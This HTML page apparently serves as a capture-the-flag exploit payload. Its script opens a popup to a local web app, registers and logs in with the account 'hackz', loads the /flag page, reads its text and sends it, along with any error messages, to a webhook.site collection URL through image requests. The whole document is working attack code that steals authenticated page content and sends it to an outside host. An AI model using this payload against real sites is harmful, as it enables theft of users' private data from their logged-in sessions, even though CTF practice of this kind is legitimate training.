<!DOCTYPE html>
<html>
<body>
<script>
var popup = window.open('http://0.0.0.0:3000/register', 'p');

setTimeout(function(){
  try {
    popup.document.querySelector('input[name="username"]').value = 'hackz';
    popup.document.querySelector('input[name="password"]').value = 'hackz';
    popup.document.querySelector('form').submit();
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err1=' + encodeURIComponent(e.message);
  }
}, 300);

setTimeout(function(){
  popup.location.href = 'http://0.0.0.0:3000/login';
}, 600);

setTimeout(function(){
  try {
    popup.document.querySelector('input[name="username"]').value = 'hackz';
    popup.document.querySelector('input[name="password"]').value = 'hackz';
    popup.document.querySelector('form').submit();
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err2=' + encodeURIComponent(e.message);
  }
}, 900);

setTimeout(function(){
  popup.location.href = 'http://0.0.0.0:3000/flag';
}, 1200);

setTimeout(function(){
  try {
    var flag = popup.document.body.innerText;
    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(flag);
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err3=' + encodeURIComponent(e.message);
  }
}, 1500);
</script>
</body>
</html>
